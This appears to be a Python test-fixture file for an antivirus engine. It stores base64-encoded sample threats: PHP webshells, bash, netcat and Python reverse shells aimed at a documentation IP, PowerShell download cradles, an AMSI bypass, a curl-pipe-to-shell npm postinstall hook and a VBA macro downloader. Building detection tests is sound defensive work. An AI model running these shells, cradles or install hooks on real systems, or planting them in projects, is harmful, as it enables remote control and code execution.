"""
samples.py - test corpus for the av engine.

Malicious / suspicious samples are stored BASE64-ENCODED and decoded only in
memory by the tests. That keeps live signatures out of the repository, so the
repo's own self-scan stays clean and other AV products don't flag the source.
Every sample is inert (documentation IPs from 203.0.113.0/24, no real payloads).
"""

import base64

def _d(s: str) -> bytes:
    return base64.b64decode(s)


# filename -> (expected threat name, base64 content)
MALICIOUS = {
    'webshell_eval.php': ('Webshell.PHP.SuperglobalExec', 'PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+Cg=='),
    'webshell_system.php': ('Webshell.PHP.SuperglobalExec', 'PD9waHAKaWYgKGlzc2V0KCRfR0VUWydjJ10pKSB7IHN5c3RlbShiYXNlNjRfZGVjb2RlKCRfR0VUWydjJ10pKTsgfQo='),
    'revshell.sh': ('HackTool.ReverseShell.Bash', 'IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNy80NDQ0IDA+JjEK'),
    'bind.sh': ('HackTool.ReverseShell.Netcat', 'IyEvYmluL3NoCndoaWxlIHRydWU7IGRvIG5jIC1sdnAgOTAwMSAtZSAvYmluL3NoOyBkb25lCg=='),
    'revshell.py': ('HackTool.ReverseShell.Python', 'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjIwMy4wLjExMy43Iiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKQpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'),
    'cradle.ps1': ('Trojan.PowerShell.DownloadExec', 'cG93ZXJzaGVsbC5leGUgLW5vcCAtdyBoaWRkZW4gLWMgIklFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzIwMy4wLjExMy43L2EucHMxJykiCg=='),
    'cradle_b64.bat': ('Trojan.PowerShell.DownloadExec', 'QGVjaG8gb2ZmCnBvd2Vyc2hlbGwgLWVwIGJ5cGFzcyAtYyAiJHM9W1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ2FHaz0nKSk7IElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygkcykiCg=='),
    'amsi.ps1': ('Trojan.PowerShell.AmsiBypass', 'W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpCg=='),
    'postinstall.js': ('Trojan.JS.EncodedExec', 'cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoQnVmZmVyLmZyb20oJ1kzVnliQ0JvZEhSd09pOHZNakF6TGpBdU1URXpMamN2ZUNCOElITm8nLCAnYmFzZTY0JykudG9TdHJpbmcoKSk7Cg=='),
    'loader.py': ('Trojan.Python.EncodedExec', 'aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ0FBRUNBd1FGQmdjSUNRb0xEQTBPRHhBUkVoTVVGUllYR0JrYUd4d2RIaDhnSVNJakpDVW1KeWdwS2lzc0xTNHZNREV5TXpRMU5qYzRPVG83UEQwK1AwQkJRa05FUlVaSFNFbEtTMHhOVGs5UVVWSlRWRlZXVjFoWldsdGNYVjVmWUdGaVkyUmxabWRvYVdwcmJHMXViM0J4Y25OMGRYWjNlSGw2ZTN4OWZuK0FnWUtEaElXR2g0aUppb3VNalk2UGtKR1NrNVNWbHBlWW1acWJuSjJlbjZDaG9xT2twYWFucUttcXE2eXRycSt3c2JLenRMVzJ0N2k1dXJ1OHZiNi93TUhDdzhURnhzZkl5Y3JMek0zT3o5RFIwdFBVMWRiWDJObmEyOXpkM3QvZzRlTGo1T1htNStqcDZ1dnM3ZTd2OFBIeTgvVDE5dmY0K2ZyNy9QMysvd0FCQWdNRUJRWUhDQWtLQ3d3TkRnOFFFUklURkJVV0Z4Z1pHaHNjSFI0ZklDRWlJeVFsSmljb0tTb3JMQzB1THpBeE1qTTBOVFkzT0RrNk96dzlQajlBUVVKRFJFVkdSMGhKU2t0TVRVNVBVRkZTVTFSVlZsZFlXVnBiWEYxZVgyQmhZbU5rWldabmFHbHFhMnh0Ym05d2NYSnpkSFYyZDNoNWVudDhmWDUvZ0lHQ2c0U0Zob2VJaVlxTGpJMk9qNUNSa3BPVWxaYVhtSm1hbTV5ZG5wK2dvYUtqcEtXbXA2aXBxcXVzcmE2dnNMR3lzN1MxdHJlNHVicTd2TDIrdjhEQndzUEV4Y2JIeU1uS3k4ek56cy9RMGRMVDFOWFcxOWpaMnR2YzNkN2Y0T0hpNCtUbDV1Zm82ZXJyN08zdTcvRHg4dlAwOWZiMytQbjYrL3o5L3Y4PScpKQo='),
    'loader2.py': ('Trojan.Python.EncodedExec', 'ZXhlYyhfX2ltcG9ydF9fKCd6bGliJykuZGVjb21wcmVzcyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ0FBRUNBd1FGQmdjSUNRb0xEQTBPRHhBUkVoTVVGUllYR0JrYUd4d2RIaDhnSVNJakpDVW1KeWdwS2lzc0xTNHZNREV5TXpRMU5qYzRPVG83UEQwK1AwQkJRa05FUlVaSFNFbEtTMHhOVGs5UVVWSlRWRlZXVjFoWldsdGNYVjVmWUdGaVkyUmxabWRvYVdwcmJHMXViM0J4Y25OMGRYWjNlSGw2ZTN4OWZuK0FnWUtEaElXR2g0aUppb3VNalk2UGtKR1NrNVNWbHBlWW1acWJuSjJlbjZDaG9xT2twYWFucUttcXE2eXRycSt3c2JLenRMVzJ0N2k1dXJ1OHZiNi93TUhDdzhURnhzZkl5Y3JMek0zT3o5RFIwdFBVMWRiWDJObmEyOXpkM3QvZzRlTGo1T1htNStqcDZ1dnM3ZTd2OFBIeTgvVDE5dmY0K2ZyNy9QMysvd0FCQWdNRUJRWUhDQWtLQ3d3TkRnOFFFUklURkJVV0Z4Z1pHaHNjSFI0ZklDRWlJeVFsSmljb0tTb3JMQzB1THpBeE1qTTBOVFkzT0RrNk96dzlQajlBUVVKRFJFVkdSMGhKU2t0TVRVNVBVRkZTVTFSVlZsZFlXVnBiWEYxZVgyQmhZbU5rWldabmFHbHFhMnh0Ym05d2NYSnpkSFYyZDNoNWVudDhmWDUvZ0lHQ2c0U0Zob2VJaVlxTGpJMk9qNUNSa3BPVWxaYVhtSm1hbTV5ZG5wK2dvYUtqcEtXbXA2aXBxcXVzcmE2dnNMR3lzN1MxdHJlNHVicTd2TDIrdjhEQndzUEV4Y2JIeU1uS3k4ek56cy9RMGRMVDFOWFcxOWpaMnR2YzNkN2Y0T0hpNCtUbDV1Zm82ZXJyN08zdTcvRHg4dlAwOWZiMytQbjYrL3o5L3Y4PScpKSkK'),
    'drop.sh': ('Trojan.Shell.Base64Pipe', 'IyEvYmluL3NoCmVjaG8gJ1kzVnliQ0F0Y3lCb2RIUndPaTh2TWpBekxqQXVNVEV6TGpjdmVDQjhJSE5vQ2c9PScgfCBiYXNlNjQgLWQgfCBiYXNoCg=='),
    'macro.vbs': ('Trojan.VBA.AutoExecDownloader', 'U3ViIEF1dG9PcGVuKCkKICBTZXQgeCA9IENyZWF0ZU9iamVjdCgiTVNYTUwyLlhNTEhUVFAiKQogIHguT3BlbiAiR0VUIiwgImh0dHA6Ly8yMDMuMC4xMTMuNy9wLmV4ZSIsIEZhbHNlCiAgeC5TZW5kCiAgQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuICJwLmV4ZSIKRW5kIFN1Ygo='),
}

SUSPICIOUS = {
    'miner.json': ('PUA.CoinMiner', 'eyJhdXRvc2F2ZSI6IHRydWUsICJwb29scyI6IFt7InVybCI6ICJzdHJhdHVtK3RjcDovL3Bvb2wuZXhhbXBsZS5vcmc6MzMzMyIsICJ1c2VyIjogIngifV0sICJkb25hdGUtbGV2ZWwiOiAxLCAiYWxnbyI6ICJyeC8wIiwgImFwcCI6ICJ4bXJpZyJ9Cg=='),
    'README_RECOVER.txt': ('Ransom.Note', 'QVRURU5USU9OISBBbGwgeW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLgpUbyBkZWNyeXB0IHRoZW0gc2VuZCAwLjUgQlRDIHRvIGJjMXFhcjBzcnJyN3hma3Z5NWw2NDNseWRudzlyZTU5Z3R6endmNW1kcQo='),
    'package.json': ('Suspicious.NPM.InstallScriptPipeShell', 'eyJuYW1lIjogIngiLCAidmVyc2lvbiI6ICIxLjAuMCIsICJzY3JpcHRzIjogeyJwb3N0aW5zdGFsbCI6ICJjdXJsIC1zIGh0dHA6Ly8yMDMuMC4xMTMuNy9pLnNoIHwgc2gifX0K'),
}


def decoded(table: dict) -> dict[str, tuple[str, bytes]]:
    return {name: (threat, _d(b64)) for name, (threat, b64) in table.items()}


def eicar() -> bytes:
    # the standard 68-byte EICAR test string, assembled at runtime
    return _d('WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=')
